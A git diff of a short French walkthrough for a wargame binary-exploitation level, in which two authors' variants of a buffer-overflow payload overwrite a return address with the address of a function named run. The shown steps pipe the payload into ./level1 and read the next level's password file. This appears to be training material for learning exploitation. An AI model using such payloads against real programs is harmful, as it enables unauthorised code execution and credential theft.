@@ -10,7 +10,11 @@ pour récupérer l'adresse de la fonction run on utilise gdb:
 - disas run
 on nous donne l'adresse: 0x08048444, que l'on inverse en little endian pour obtenir 44 84 04 08
 
-- printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08" > /tmp/exploit
+Nous avons deux codes differents: lvasseur prefere
+  - printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08" > /tmp/exploit
+Et lomeress:
+  - n=76; for i in $(seq $n); do printf "a"; done > /tmp/slut && printf "\x44\x84\x04\x08" >> /tmp/slut
+votez pour celui que vous prefêrez
 - cat /tmp/exploit - | ./level1
 - appuyer sur entré
 - cat /home/user/level2/.pass
